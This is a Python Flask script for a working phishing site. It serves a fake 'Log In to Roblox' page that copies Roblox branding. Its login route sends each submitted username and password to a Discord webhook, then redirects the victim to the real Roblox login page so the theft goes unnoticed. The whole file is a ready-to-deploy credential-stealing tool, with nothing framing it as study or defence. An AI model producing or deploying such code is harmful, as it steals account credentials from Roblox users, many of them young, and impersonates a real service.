from flask import Flask, request, redirect, render_template_string
import requests
import datetime

app = Flask(__name__)

# Discord webhook URL (replace with your own)
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

# HTML template for the fake login page
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .login-container img {
            width: 100px;
            margin-bottom: 20px;
        }
        .login-container h2 {
            color: #1f1f1f;
            margin-bottom: 20px;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #00a2ff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container button:hover {
            background-color: #0088cc;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.roblox.com/images/logo.png" alt="Roblox Logo">
        <h2>Log In to Roblox</h2>
        <form method="POST" action="/login">
            <input type="text" id="username" name="username" placeholder="Username or Email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <div id="errorMessage" class="error-message">Please enter valid credentials.</div>
        </form>
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(LOGIN_PAGE)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    # Validate inputs
    if not username or not password:
        return render_template_string(LOGIN_PAGE + """
        <script>document.getElementById("errorMessage").style.display = "block";</script>
        """)

    # Prepare data for Discord webhook
    data = {
        "content": None,
        "embeds": [{
            "title": "Roblox Login Attempt",
            "color": 0xFF0000,
            "fields": [
                {"name": "Username/Email", "value": username, "inline": True},
                {"name": "Password", "value": password, "inline": True}
            ],
            "timestamp": datetime.datetime.utcnow().isoformat()
        }]
    }

    # Send to Discord webhook
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error sending to webhook: {e}")

    # Redirect to official Roblox login page
    return redirect("https://www.roblox.com/login")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
